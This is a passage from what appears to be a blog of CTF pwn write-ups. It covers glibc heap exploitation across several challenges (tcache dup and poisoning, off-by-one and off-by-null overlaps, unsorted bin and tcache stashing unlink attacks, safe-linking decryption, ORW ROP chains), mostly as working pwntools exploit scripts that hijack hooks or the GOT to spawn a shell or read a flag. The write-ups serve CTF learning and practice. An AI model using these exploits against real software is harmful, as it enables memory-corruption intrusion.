0x955e1a0       0x00000000      0x00000000      ........
0x955e1a8       0x00000000      0x00000000      ........
0x955e1b0       0x00000000      0x00000000      ........
0x955e1b8       0x00000000      0x00000011      ........
0x955e1c0       0x0955e160      0x08048725      `.U.%...         &lt;-- tcachebins[0x10][0/2]
0x955e1c8       0x0955e1d0      0x00000051      ..U.Q...
0x955e1d0       0x0955e170      0x0000000a      p.U.....         &lt;-- tcachebins[0x30][0/2]
0x955e1d8       0x00000000      0x00000000      ........
0x955e1e0       0x00000000      0x00000000      ........
0x955e1e8       0x00000000      0x00000000      ........
0x955e1f0       0x00000000      0x00000000      ........
0x955e1f8       0x00000000      0x00000000      ........
0x955e200       0x00000000      0x00000000      ........
0x955e208       0x00000000      0x00000000      ........
0x955e210       0x00000000      0x00000000      ........
0x955e218       0x00000000      0x00021de9      ........         &lt;-- Top chunk
</code></pre>
<p>Each time <code>add(0x40)</code> is called (where 0x40 can be replaced with other values), both <code>malloc(0xc)</code> and <code>malloc(0x40)</code> are executed. At this point, calling <code>add(0xc)</code> again will refill the first and third tcache entries.</p>
<p>Due to the LIFO mechanism of tcache, the next two mallocs will first fill the third tcache entry, then the first.</p>
<p>Observe the <code>del</code> function:</p>
<pre><code class="language-c">int do_del()
&#123;
  int v0; // eax

  v0 = ask(&quot;Index&quot;);
  return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]);
&#125;
</code></pre>
<p>It can be seen that during <code>add(0xc)</code>, <code>rec_str_free()</code>â€”i.e., <code>records[0] + 4</code>â€”is overwritten with the PLT address of <code>system()</code>, and <code>records[v0]</code> becomes the address of the string <code>'sh'</code>.</p>
<p>Thus, when <code>free(0)</code> is called, it is equivalent to executing <code>system('sh')</code>, which results in obtaining a shell.</p>
<h3 id="npuctf-2020-easyheapâ€”â€”off-by-one-chunk-overlap">npuctf_2020_easyheapâ€”â€”off by one+chunk overlap</h3>
<pre><code class="language-python">def exploit():
   add(0x18, 'a'*0x18) #0   
   add(0x18, 'b'*0x18) #1
   add(0x18, '/bin/sh\0') #2
   edit(0, 'x'*0x18+'\x41')
   free(1)
   add(0x38, p64(0)*3+p64(0x21)+p64(0x38)+p64(elf.got['free'])) #1
   show(1)

   libc_base = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym['free']
   log.info('libc_base: ' + hex(libc_base))
   libc_sys = libc_base + libc.sym['system']

   edit(1, p64(libc_sys))
   free(2)
</code></pre>
<h3 id="hitcontraining-magicheapâ€”Unsorted-Bin-Attack">hitcontraining_magicheapâ€”Unsorted Bin Attack</h3>
<p>The core of the unsorted bin attack is to tamper with the bk pointer to an arbitrary address, causing that address to be overwritten with a very large number.</p>
<pre><code class="language-python">def exploit():
   add(0x500, 'aaaa')
   add(0x500, 'bbbb')
   add(0x500, 'cccc')
   free(1)
   edit(0, 0x520, b'a'*0x500 + p64(0) + p64(0x511) + p64(0) + p64(magic-0x10))

   add(0x500, '\0')
   io.sendline('4869')
</code></pre>
<h3 id="ciscn-2019-final-3-â€”-tcache-dup">ciscn_2019_final_3 â€” tcache dup</h3>
<p>The knowledge point isn't difficult, but the implementation is quite tricky.</p>
<p>A key point is that if the tcache and unsortedbin pointers are the same, free the tcache first, then free the unsortedbin. This allows allocating to a libc address after two mallocs.</p>
<pre><code class="language-python">def exploit():
   gift = add(0, 0x18, b'a')
   dele(0) # first free it as a tcache

   for i in range(1, 9):
      add(i, 0x68, b'a') # padding

   add(9, 0x78, b'v') # padding cause 0x20+0x70*8+0x80 = 0x420, to pass unsortedbin free check
   add(10, 0x28, b'/bin/sh\0') # avoid merging with top chunk 
   dele(9)
   dele(9) # tcache dup
   add(11, 0x78, p64(gift-0x10))
   add(12, 0x78, p64(gift-0x10))
   add(13, 0x78, p64(0)+p64(0x421)) # modify chunk0's size to unsortedbin  

   dele(0) # second free it as an unsortedbin

   add(14, 0x18, b'a')
   libc_base = add(15, 0x18, b'a') - libc.sym['__malloc_hook'] - 0x70
   print(hex(libc_base))
   libc_sys = libc_base + libc.sym['system']
   free_hook = libc_base + libc.sym['__free_hook']

   dele(5)
   dele(5)
   add(16, 0x68, p64(free_hook))
   add(17, 0x68, b'n1rvana_yyds')
   add(18, 0x68, p64(libc_sys)) # modify free_hook's content to system

   dele(10)
</code></pre>
<h3 id="hitcon-2018-children-tcacheâ€”â€”off-by-null">hitcon_2018_children_tcacheâ€”â€”off by null</h3>
<p>Classic sandwich method.</p>
<pre><code class="language-python">def exploit():
   add(0x438, 'a') #0
   add(0x38, 'b') #1
   add(0x4f8, 'c') #2, must be multiples of 0x100
   add(0x18, '/bin/sh\0') #3
   dele(0)
   dele(1)

   for i in range(9): # clear prev_size bit by bit
      add(0x38-i, b't'*(0x38-i)) #0
      dele(0)
   add(0x38, b't'*0x30+p64(0x440+0x40)) #0
   dele(2)

   add(0x438, b'libc') #1
   show(0)

   libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x70
   log.info('libc_base: ' + hex(libc_base))
   free_hook = libc_base + libc.sym['__free_hook']
   one_gadget = libc_base + ogg_offset

   add(0x38, 'd') #2
   dele(0)
   dele(2)
   add(0x38, p64(free_hook))
   add(0x38, p64(free_hook))
   add(0x38, p64(one_gadget))
   dele(3)
</code></pre>
<h3 id="gyctf-2020-signinâ€”tcache-calloc">gyctf_2020_signinâ€”tcache&amp;calloc</h3>
<p>calloc has the following characteristics:</p>
<ul>
<li>It does not allocate chunks from the tcache.</li>
</ul>
<p>tcache has the following characteristics:</p>
<ul>
<li>When allocating a chunk from the fastbin, if there are other fastbin_chunks of the same size, they are all placed into the tcache.</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/13473995.html">https://www.cnblogs.com/luoleqi/p/13473995.html</a></p>
</blockquote>
<pre><code class="language-python">def exploit():
   for i in range(8):
      add(i)
   for i in range(8):
      dele(i)
   add(8) # give a blank to tcache
   edit(7, p64(ptr-0x10)) # it's in fastbin, so the calloc() will put ptr-0x10 in tcache bin
   backdoor() # and the target will become fd of 6th tcache bin
</code></pre>
<img src = 'https://img.junyu33.me/blog/bin_ctf/image-20220904123230378.png'>
<h3 id="ciscn-2019-final-5â€”overflow-unlink-no-show">ciscn_2019_final_5â€”overflow+unlink+no show</h3>
<p>Forcibly adapted from the approach used in zctf_2016_note3.</p>
<ul>
<li>Heap overflow caused by a logic vulnerability</li>
<li>Unlink</li>
<li>Modify <code>free.got</code> to <code>puts.plt</code></li>
<li>1/16 chance to leak heap address</li>
<li>Leak libc address after unsortedbin free</li>
<li>Change <code>free.got</code> to <code>system</code>, then getshell</li>
</ul>
<blockquote>
<p>ðŸŽ‰ Celebrating the completion of page 4 on buu <em>â˜…,Â°</em>:.â˜†(ï¿£â–½ï¿£)/$:<em>.Â°â˜…</em> ã€‚</p>
</blockquote>
<pre><code class="language-python">def exploit():
   # heap overflow + fake_chunk
   add(16, 0x448, 'aaaaaaaa')
   add(1, 0x88, 'bbbbbbbb')
   add(2, 0x18, '\xc0')
   add(3, 0x18, '/bin/sh\0')
   fake_chunk = p64(0)+p64(0x431)+p64(buf-0x18)+p64(buf-0x10)
   edit(0, fake_chunk.ljust(0x430, b'\0')+p64(0x430)+p64(0x90))
   # unlink, buf[0] = 0x6020c8
   for i in range(4, 11):
      add(i, 0x88, 'xxxxxxxx')  
   for i in range(4, 11):
      dele(i)
   dele(1) 
   # make len[8] &gt; 0
   for i in range(4, 9):
      add(i, 0x448, '\xc0')
   # leak heap_base
   edit(8, p64(0)*4+p64(buf-0x18)+p64(elf.got['free']-1)+p16(0x5812))
   edit(7, p64(0)+p64(elf.plt['puts']))
   dele(2)
   io.recvuntil(': ')
   tmp = io.recvline()[:-1]
   heap_base = u32(tmp.ljust(4, b'\0')) &amp; 0xfffff000
   log.success('heap_base: '+hex(heap_base))
   # leak libc_base
   edit(8, p64(0)*4+p64(buf-0x18)+p64(elf.got['free']-1)+p64(heap_base+0x282))
   dele(2)
   io.recvuntil(': ')
   libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\0')) - (0x7fd7b3f920c0 - 0x7fd7b3ba6000)
   log.success('libc_base: '+hex(libc_base))
   # getshell
   edit(7, p64(0)+p64(libc_base+libc.sym['system']))
   dele(3)
</code></pre>
<h3 id="roarctf-2019-realloc-magicâ€”realloc-stdout-tcache-poisoning">roarctf_2019_realloc_magicâ€”realloc+stdout+tcache_poisoning</h3>
<blockquote>
<p>For the leak part, having a show function is ideal.</p>
<p>If there is no show function but <code>PIE</code> is disabled, you can try overwriting <code>free.got</code> with <code>puts.plt</code> or <code>printf.plt</code>.</p>
<p>If <code>PIE</code> is enabled, the only option is to use <code>IO_stdout</code>.</p>
</blockquote>
<p>Characteristics of <code>realloc</code>:</p>
<ul>
<li>When ptr == nullptr, it is equivalent to malloc(size), returning the address of the allocated memory.</li>
<li>When ptr != nullptr &amp;&amp; size == 0, it is equivalent to free(ptr), returning a null pointer.</li>
<li>When size is smaller than the original memory block pointed to by ptr, it directly shrinks the block and returns the ptr pointer. The trimmed portion is freed and placed into the corresponding bins.</li>
<li>When size is larger than the original memory block pointed to by ptr, if there is sufficient space after the chunk pointed to by ptr, it expands directly and returns the ptr pointer; if there is not enough space, it first frees the memory allocated by ptr, then attempts to allocate memory of size, and returns the pointer to the newly allocated memory.</li>
</ul>
<blockquote>
<p>Copyright Notice: This article is an original work by &quot;Assassin__is__me&quot; on CSDN, following the CC 4.0 BY-SA copyright license. Please include the original source link and this statement when reproducing.
Original link: <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35078631/article/details/126913140">https://blog.csdn.net/qq_35078631/article/details/126913140</a></p>
</blockquote>
<p>Explanation of the magic number <code>0xfbad1800</code>: <a target="_blank" rel="noopener" href="https://n0va-scy.github.io/2019/09/21/IO_FILE/">https://n0va-scy.github.io/2019/09/21/IO_FILE/</a></p>
<pre><code class="language-python">def exploit():
   realloc(0x18, 'a')
   realloc(0, '') # free it and set the NULL pointer
   realloc(0x88, 'b')
   realloc(0, '')
   realloc(0x28, '/bin/sh\0')
   realloc(0, '')
   realloc(0x88, 'bb')
   for i in range(7):
      dele()
   realloc(0, '') # unsorted bin

   realloc(0x18, 'a')
   # offset = int(input('input offset: '), 16) # debug
   offset = 1 # 1/16 brute force
   offset = (offset&lt;&lt;4)+7
   payload = p64(0)*3 + p64(0x61) + p8(0x60) + p8(offset) # _IO_2_1_stdout_

   realloc(0x48, payload) # tcache poisoning
   realloc(0, '')
   realloc(0x88, 'b')
   realloc(0, '')
   realloc(0x88, p64(0xfbad1800)+p64(0)*3+p8(0x58)) # some kind of magic qwq

   libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\0')) + (0x7ff04c342000 - 0x7ff04c72a2a0)
   log.success(message='libc_base: ' + hex(libc_base))
   free_hook = libc_base + libc.sym['__free_hook']
   libc_sys = libc_base + libc.sym['system']
   lock() # restart


   realloc(0x18, 'a') # the same method again
   realloc(0, '')
   realloc(0x98, 'b')
   realloc(0, '')
   realloc(0x28, '/bin/sh\0')
   realloc(0, '')
   realloc(0x98, 'bb')
   for i in range(7):
      dele()
   realloc(0, '')

   realloc(0x18, 'a')
   payload = p64(0)*3 + p64(0x61) + p64(free_hook-0x8)

   realloc(0x48, payload)
   realloc(0, '')
   realloc(0x98, 'b')
   realloc(0, '')
   realloc(0x98, b'/bin/sh\0' + p64(libc_sys))
   dele()
</code></pre>
<h3 id="sctf-2019-easy-heapâ€”unlink-stdout-tcache-poisoning">sctf_2019_easy_heapâ€”unlink+stdout+tcache_poisoning</h3>
<p>The mmap was not used; directly brute-forced <code>stdout</code>.</p>
<p>First, free a series of chunks into tcache, then modify the size and free into unsortedbin, followed by tcache_poisoning to overwrite <code>stdout</code>. The subsequent steps are similar to the previous challenge.</p>
<pre><code class="language-python">def exploit():
   # no use
   io.recvuntil('Mmap: ')
   mmap_addr = int(io.recvline(), 16)
   print(hex(mmap_addr))
   # unlink part
   add(0x18) #0
   heap_ptr = add(0x68) #1
   elf_base = heap_ptr-0x18-0x202060
   log.success('heap_ptr: ' + hex(heap_ptr))
   add(0x4f8) #2, must be multiples of 0x100
   add(0x18) #3

   fake_chunk = p64(0)+p64(0x61)+p64(heap_ptr-0x18)+p64(heap_ptr-0x10)
   fake_chunk = fake_chunk.ljust(0x60, b'\0') + p64(0x60)
   edit(1, fake_chunk)
   dele(2)
   # free into tcache first
   add(0x68) #2
   [add(0x88) for i in range(7)] #4~10
   add(0x5f8) #11
   edit(4, p64(0)*2+p64(0x90)+p64(0x101)+b'\n') # bypass unlink check
   dele(2)
   [dele(i) for i in range(4, 11)]
   # free into unsorted bin
   edit(1, p64(0x458)+p8(0x80) + b'\n')
   edit(0, p64(0x30)+p64(0x91) + b'\n')
   edit(1, p64(0x458)+p8(0x90) + b'\n')
   dele(0)
   # IO_file attack
   add(0x18) #0
   # offset = int(input('input offset: '), 16) # debug
   offset = 5 # 1/16 brute force
   offset = (offset&lt;&lt;4)+7
   payload = p8(0x60) + p8(offset) + b'\n'
   edit(0, payload)
   # leak libc
   add(0x68) #2
   add(0x68) #4
   edit(4, p64(0xfbad1800)+p64(0)*3+p8(0x58)+b'\n')
   libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\0'))-0x3e82a0
   log.success('libc_base: ' + hex(libc_base))
   # getshell
   edit(1, p64(0x18)+p64(libc_base+libc.sym['__free_hook']) + b'\n')
   edit(0, p64(libc_base+libc.sym['system']) + b'\n')
   edit(3, b'/bin/sh\x00' + b'\n')
   dele(3)
</code></pre>
<h3 id="SWPUCTF-2019-p1KkHeapâ€”â€”tcache-perthread-struct-orw">SWPUCTF_2019_p1KkHeapâ€”â€”tcache_perthread_struct+orw</h3>
<p>The tcache_perthread_struct has two functionalities:</p>
<ul>
<li>The first 64 bytes (changed to 128 bytes after version 2.29) modify the count (cnt).</li>
<li>The following 512 bytes modify the allocation location of the next chunk for the corresponding size.</li>
</ul>
<p>Since the program limits the number of free operations to three, we first use <code>tcache_dup</code> to gain control of <code>tcache_perthread_struct</code> and modify the <code>cnt</code>, so that subsequent 0x90-sized chunks are directly placed into the unsorted bin when freed. Then, we change the next allocation location for the 0x80-sized chunk to a mmap-allocated address and write the ORW shellcode to read the flag. For the 0x90-sized chunk, we change it to <code>__malloc_hook</code> or <code>__exit_hook</code> and write the mmap address. Finally, triggering a malloc or exit will execute the shellcode.</p>
<p>I used <code>__malloc_hook</code>, and all constraints were met perfectly.</p>
<blockquote>
<p>The shell on the telecom broadband had no echo, while the campus network didâ€”quite puzzling.</p>
</blockquote>
<pre><code class="language-python">def exploit():
   add(0x88) # 0
   add(0x88) # 1
   dele(1)
   dele(1)
   show(1)

   io.recvuntil('content: ')
   heap_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) - 0x2f0
   log.info('heap_base: ' + hex(heap_base))
   add(0x88) # 2
   edit(2, p64(heap_base+0x10))
   add(0x88) # 3
   add(0x88) # 4

   edit(4, b'\x3f'*16 + p64(0)*13 + p64(0x66660000))
   dele(0)
   show(0)

   io.recvuntil('content: ')
   libc_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebca0
   log.info('libc_base: ' + hex(libc_base))

   edit(4, b'\x3f'*16 + p64(0)*12 + p64(libc_base + libc.sym['__malloc_hook']) + p64(0x66660000))
   add(0x88) # 5
   shellcode = shellcraft.open('/flag')
   shellcode += shellcraft.read('rax', 'rsp', 100)
   shellcode += shellcraft.write(1, 'rsp', 100)
   payload = asm(shellcode)
   edit(5, payload)

   add(0x78) # 6
   edit(6, p64(0x66660000))
   add(0x78) # 7
</code></pre>
<h2 id="libc-2-29-libc-2-27-3ubuntu1-3-without-tcache-dup">libc 2.29 (&gt;=libc 2.27-3ubuntu1.3, without tcache_dup)</h2>
<h3 id="Peak-Geek-Gift-Heap-Feng-Shui-Tcache-Poisoning">Peak Geek Gift - Heap Feng Shui + Tcache Poisoning</h3>
<p>Initially, I tried the <code>tcache_dup</code> method directly, only to find that libc 2.27 no longer supports it!</p>
<blockquote>
<p>Since September 10, 2020, starting from version 2.27-3ubuntu1.3, partial modifications have been made to tcache, making it very similar to version 2.29. Most current challenges are based on this enhanced version, where double free no longer exists.</p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269145.htm#msg_header_h1_4">https://bbs.pediy.com/thread-269145.htm#msg_header_h1_4</a></p>
</blockquote>
<p>The correct solution is as follows:</p>
<blockquote>
<p>Because this challenge has too few indices (10), directly freeing 7 chunks to fill the tcache_list is not feasible. Instead, I used the bargain function to modify the fd pointer to a fake_chunk. This fake_chunk falls within the size range of unsortedbin and can be modified by adding a 0x60-sized heap chunk to alter the next pointer of a previously freed 0x100-sized tcache.</p>
<p>This approach not only leaks the fd of the unsorted bin but also modifies the fd of the next freed tcache, achieving tcache_dup.
â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”
Copyright Notice: This article is an original work by the CSDN blogger &quot;LoÏ„Ï…s,&quot; following the CC 4.0 BY-SA copyright license. Please include the original source link and this statement when reprinting.
Original link: <a target="_blank" rel="noopener" href="https://blog.csdn.net/Invin_cible/article/details/126396402">https://blog.csdn.net/Invin_cible/article/details/126396402</a></p>
</blockquote>
<p>The heap layout is roughly as follows:</p>
<img src = 'https://img.junyu33.me/blog/bin_ctf/image-20220818151228918-16608067531591.png'>
<pre><code class="language-python">def exploit():
   payload = b'a'*0xa0 + p64(0) + p64(0x421)
   add(1, payload) #0
   add(1, 'gggg') #1
   add(1, 'kkkk') #2
   add(1, 'dddd') #3
   add(1, b'a'*0x80 + p64(0) + p64(0x71)) #4
   dele(0)
   dele(1)

   bargain(1, -0xc0)

   add(1, 'xxxx') #5
   add(1, 'yyyy') #6

   dele(6)

   show(6) 
   libc_base = int(io.recvuntil(b'\n')[:-1],10) - malloc_offset
   log.success(message='libc_base: ' + hex(libc_base))
   one_gadget = libc_base + ogg_offset
   free_hook = libc_base + libc.sym['__free_hook']

   dele(2)
   dele(1)
   add(2, p64(free_hook-0x10)*10) #7
   add(1, '/bin/sh\0') #8
   add(1, p64(one_gadget)) #9

   dele(3)
</code></pre>
<h3 id="2020-New-Year-Red-Packet-Challenge-3-â€”-tcache-stashing-unlink-attack-orw-rop">[2020 New Year Red Packet Challenge] 3 â€” tcache stashing unlink attack + orw rop</h3>
<h4 id="Attack-Objectives">Attack Objectives</h4>
<ol>
<li>Write a specified value to an arbitrary location.</li>
<li>Allocate a chunk at an arbitrary address.</li>
</ol>
<h4 id="Prerequisites">Prerequisites</h4>
<ol>
<li>Ability to control the <code>bk</code> pointer of a Small Bin chunk.</li>
<li>The program can bypass Tcache when fetching chunks (achievable using <code>calloc</code>).</li>
<li>The program can allocate at least two different sizes of chunks that fall into the unsorted bin category.</li>
</ol>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/198173?display=mobile#h3-3">https://www.anquanke.com/post/id/198173?display=mobile#h3-3</a></p>
</blockquote>
<p>The challenge requires writing a value greater than <code>0x7f0000000000</code> to a specified location. However, due to additional restrictions on <code>unsortedbin</code> in libc2.29, the <code>unsortedbin attack</code> is no longer effective.</p>
<p>Since the program uses <code>calloc</code> to allocate memory, it is not possible to write values to regions like <code>malloc_hook</code> using the <code>tcache poisoning</code> method. But <code>calloc</code> happens to be a necessary condition for the <code>tcache stashing unlink attack</code> â€” as the saying goes, &quot;When God closes a door, he opens a window.&quot;</p>
<p>Afterward, use the <code>rop</code> method with <code>orw</code> to read the <code>flag</code>.</p>
<pre><code class="language-python">def exploit():
   [[add(15, 4, 'chunk15\0'*4), dele(15)] for _ in range(7)]
   [[add(14, 2, 'chunk14\0'*4), dele(14)] for _ in range(6)]
   show(15)
   heap_base = u64(io.recvline()[-7:-1].ljust(8, b'\0')) - 0x26c0
   log.info('heap_base: ' + hex(heap_base))
   
   add(1, 4, 'chunk1\0'*4)
   add(13, 4, 'chunk13\0'*4) # avoid consolidate with top chunk
   dele(1)
   show(1)
   libc_base = u64(io.recvline()[-7:-1].ljust(8, b'\0')) - 0x1e4ca0
   log.info('libc_base: ' + hex(libc_base))
   # now the 0x410 tcachebin is full, and the 0x100 tcachebin has 6 chunks

   add(13, 3, 'chunk13\0'*4) # 0x410 - 0x310 = 0x100 unsortedbin
   add(13, 3, 'chunk13\0'*4) # 0x310 &gt; 0x100, so it will be put into 0x100 smallbin
   # the 0x410 unsortedbin turns to 0x100 smallbin

   add(2, 4, 'chunk2\0'*4)
   add(13, 4, 'chunk13\0'*2) # avoid consolidate with top chunk
   dele(2)
   add(13, 3, 'chunk13\0'*4) # again
   add(13, 3, 'chunk13\0'*4) 
   # another 0x100 smallbin, now smallbin: chunk2 -&gt; chunk1
   payload = b'0'*0x300+p64(0)+p64(0x101)+p64(heap_base+0x37e0)+p64(heap_base+0x250+0x10+0x800-0x10)
   edit(2, payload)
   add(3, 2, 'chunk3\0'*4)
   # tcache stashing unlink attack -&gt; write main_arena on chunk2's bk address
   pop_rdi_ret = libc_base + 0x0000000000026542
   pop_rsi_ret = libc_base + 0x0000000000026f9e
   pop_rdx_ret = libc_base + 0x000000000012bda6
   leave_ret = libc_base + 0x0000000000058373
   file_name_addr = heap_base + 0x0000000000004b40
   flag_addr = file_name_addr + 0x0000000000000200
   orw  = b'/flag\0\0\0'
   orw += p64(pop_rdi_ret)
   orw += p64(file_name_addr)
   orw += p64(pop_rsi_ret)
   orw += p64(0) # 0 is stdin, 1 is stdout, 2 is stderr
   orw += p64(libc_base+libc.symbols['open'])
   orw += p64(pop_rdi_ret)
   orw += p64(3) # 3 and so on is for new file descriptor
   orw += p64(pop_rsi_ret)
   orw += p64(flag_addr)
   orw += p64(pop_rdx_ret)
   orw += p64(0x40)
   orw += p64(libc_base+libc.symbols['read'])
   orw += p64(pop_rdi_ret)
   orw += p64(1)
   orw += p64(pop_rsi_ret)
   orw += p64(flag_addr)
   orw += p64(pop_rdx_ret)
   orw += p64(0x40)
   orw += p64(libc_base+libc.symbols['write'])

   add(4, 4, orw)
   io.sendline('666')
   io.recvuntil('What do you want to say?')
   io.send(b'a'*0x80 + p64(file_name_addr) + p64(leave_ret))
</code></pre>
<blockquote>
<p>Easter Egg:</p>
<p>After replacing <code>flag</code> with <code>links.txt</code>, there is a link: <a target="_blank" rel="noopener" href="https://buuoj.cn/files/192c547dae7b582f8b5b4665e0ad3a1d/akiwuhwh">https://buuoj.cn/files/192c547dae7b582f8b5b4665e0ad3a1d/akiwuhwh</a></p>
<p>Unfortunately, it returns a 404 error.</p>
</blockquote>
<h3 id="hitcon-ctf-2019-one-punch-manâ€”tcache-stashing-unlink-attack-orw-rop">hitcon_ctf_2019_one_punch_manâ€”tcache stashing unlink attack + orw rop</h3>
<p>Regarding the unlink attack part, here is a condensed process:</p>
<ul>
<li>Create six tcache bins of size 0x100</li>
<li>Create two small bins of size 0x100</li>
<li>Control the fd and bk pointers of the later created smallbin; set fd to the <code>prev_size</code> part of the previous smallbin, and set bk to the location where you want to overwrite the libc address (does not need to be a multiple of 0x10)</li>
<li><code>calloc(0xf0)</code></li>
</ul>
<p>Here's an explanation for why it is <code>add rsp 0x48; ret</code>:</p>
<p>In the final step when calling calloc, the stack layout is as follows, with rsp offset by 0x18 from the input:</p>
<img src='https://img.junyu33.me/blog/bin_ctf/image-20221023161650586.png'>
<p>By the time <code>call malloc_hook(rax)</code> is reached, the offset changes from 0x18 to 0x40, and the call itself pushes an additional 0x8 onto the stack. Therefore, 0x40 + 0x8 = 0x48.</p>
<img src='https://img.junyu33.me/blog/bin_ctf/image-20221023161901265.png'>
<pre><code class="language-python">def getorw(libc_base, heap_base, offset):
   pop_rdi = libc_base + 0x0000000000026542
   pop_rsi = libc_base + 0x0000000000026f9e
   pop_rdx = libc_base + 0x000000000012bda6
   pop_rax = libc_base + 0x0000000000047cf8
   syscall = libc_base + 0x00000000000cf6c5
   flag_addr = heap_base + offset
   # open
   orw = p64(pop_rdi) + p64(flag_addr)
   orw += p64(pop_rsi) + p64(0)
   orw += p64(pop_rdx) + p64(0)
   orw += p64(pop_rax) + p64(2)
   orw += p64(syscall)
   # read
   orw += p64(pop_rdi) + p64(3)
   orw += p64(pop_rsi) + p64(heap_base + 0x260)
   orw += p64(pop_rdx) + p64(0x70)
   orw += p64(pop_rax) + p64(0)
   orw += p64(syscall)
   # write
   orw += p64(pop_rdi) + p64(1)
   orw += p64(pop_rsi) + p64(heap_base + 0x260)
   orw += p64(pop_rdx) + p64(0x70)
   orw += p64(pop_rax) + p64(1)
   orw += p64(syscall)
   return orw

def exploit():
   # leak heap
   add(0, 'a' * 0x388)
   dele(0)
   edit(0, 'aaaaaaaa')
   show(0)
   io.recvuntil('aaaaaaaa')
   heap_base = u64(io.recv(6).ljust(8, b'\0')) &amp; 0xfffffffffffff000
   log.success('heap_base: ' + hex(heap_base))
   # leak libc
   [[add(1, 'a' * 0x388), dele(1)] for i in range(6)]
   add(2, 'a' * 0x388)
   add(1, b'/bin/sh\0'.ljust(0x88, b'\0'))
   dele(2)
   show(2)
   libc_base = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\0')) - 0x1e4ca0
   log.success('libc_base: ' + hex(libc_base))
   # prepare __malloc_hook at 0x221
   add(0, 'a' * 0x218)
   dele(0)
   edit(0, p64(libc_base + libc.sym['__malloc_hook']))
   # make 6 tcache bins of size 0x100
   [[add(1, 'a' * 0xf8), dele(1)] for i in range(6)]
   # make 2 smallbins of size 0x100
   add(2, 'a' * 0x388)
   add(1, 'a' * 0x88)
   dele(2)
   add(1, 'a' * 0x288)
   add(1, 'a' * 0x288)  # smallbin1

   add(2, 'a' * 0x388)
   add(1, 'a' * 0x288)
   dele(2)
   add(1, 'a' * 0x288)
   add(1, 'a' * 0x288)  # smallbin2, 0xb20 overflow
   # tcache stashing unlink attack
   payload = b'/flag'.ljust(0x280, b'\0') + p64(0) + p64(0x101) + p64(heap_base + 0x26f0) + p64(heap_base + 0x1f)
   edit(2, payload)
   add(1, 'a' * 0xf8)
   # orw &amp; get flag
   sec('yyyyyyyy')
   magic_rop = libc_base + 0x000000000008cfd6  # add rsp 0x48; ret
   payload = p64(magic_rop)
   sec(payload)
   my_orw = getorw(libc_base, heap_base, 0x2b20)
   pause()
   add(0, my_orw)
</code></pre>
<h2 id="libc-2-35">libc 2.35</h2>
<h3 id="corctf2022-cshell2â€”Heap-Overflow-Decrypt-Safe-Linking-Tcache-Poisoning">corctf2022_cshell2â€”Heap Overflow + Decrypt Safe-Linking + Tcache Poisoning</h3>
<p>The I/O is incredibly difficult to debug; it's easy to run into errors like <code>sh: 1: 2: not found</code> just when success seems within reach.</p>
<p>You can't even debug it!!!</p>
<p>Ironically: <code>corctf&#123;m0nk3y1ng_0n_4_d3bugg3r_15_th3_b35T!!!&#125;</code></p>
<pre><code class="language-python"># all io.sendline() or the stream will get stuck

def decrypt_pointer(leak: int) -&gt; int:
    parts = []

    parts.append((leak &gt;&gt; 36) &lt;&lt; 36)
    parts.append((((leak &gt;&gt; 24) &amp; 0xFFF) ^ (parts[0] &gt;&gt; 36)) &lt;&lt; 24)
    parts.append((((leak &gt;&gt; 12) &amp; 0xFFF) ^ ((parts[1] &gt;&gt; 24) &amp; 0xFFF)) &lt;&lt; 12)

    return parts[0] | parts[1] | parts[2]

def exploit():
   # leak libc
   add(0, 1032, '//bin/sh\0', '', '', 0, '')
   add(1, 1032, '', '', '', 0, '')

   for i in range(2, 11):
      add(i, 1032, '', '', '', 0, '')
   for i in range(2, 9):
      dele(i)

   dele(1) # unsortedbin
   edit(0, '', '', '', 0, b'a'*(1032-64+7)) # last byte is for '\n'
   show(0)

   libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['main_arena'] - 0x60
   # 0x1f2ce0 in glibc-2.35
   log.success('libc_base: ' + hex(libc_base))

   # leak heap
   add(11, 1032, '', '', '', 0, '') #8
   dele(9)
   edit(11, '', '', '', 0, b'b'*(1032-64)+b'abcdefg')
   show(11)
   io.recvuntil('abcdefg\n')
   heap_base = decrypt_pointer(u64(io.recvuntil(b'1 Add\n')[:-6].ljust(8, b'\x00'))) - 0x1000
   log.success('heap_base: ' + hex(heap_base))
   
   # getshell
   fake_chunk = b'c'*(1032-64)+p64(0x411)+p64(((heap_base+0x2730)&gt;&gt;12)^0x404010) # buf overflow, make the chunk aligned to 16 bytes
   edit(11, '', '', '', 0, fake_chunk)
   add(12, 1032, '', '', '', 0, '') # nothing

   io.sendline('1') # 0x2730 = 0x250 + 0x410*9 + 0x10 + 0x40
   io.sendline('13')
   io.sendline('1032')
   io.send('n1rvana') # since we make the chunk at 0x401010, it's null and we can fill anything
   io.send(p64(libc_base+libc.sym['system'])) # where the free.got is
   io.send(p64(libc_base+libc.sym['puts'])) # keeping the same
   io.sendline('0') 
   io.send(p64(libc_base+libc.sym['scanf'])) # keeping the same
   dele(0)
</code></pre>
<h1>arm</h1>
<h2 id="jarvisoj-typoâ€”â€”ARM-ROP">jarvisoj_typoâ€”â€”ARM ROP</h2>
<p>ARM Register Introduction:</p>
<table>
<thead>
<tr>
<th>Register</th>
<th>Alias/Description</th>
<th>Typical Use</th>
<th>ABI Convention (AAPCS32)</th>
</tr>
</thead>
<tbody>
<tr>
<td>R0â€“R3</td>
<td>Arguments/Return</td>
<td>Parameters &amp; Return</td>
<td><strong>caller-saved</strong></td>
</tr>
<tr>
<td>R4â€“R11</td>
<td>Saved Registers</td>
<td>Local Variables/Persistent Values</td>
<td><strong>callee-saved</strong> (R9 sometimes platform-reserved)</td>
</tr>
<tr>
<td>R12</td>
<td>IP</td>
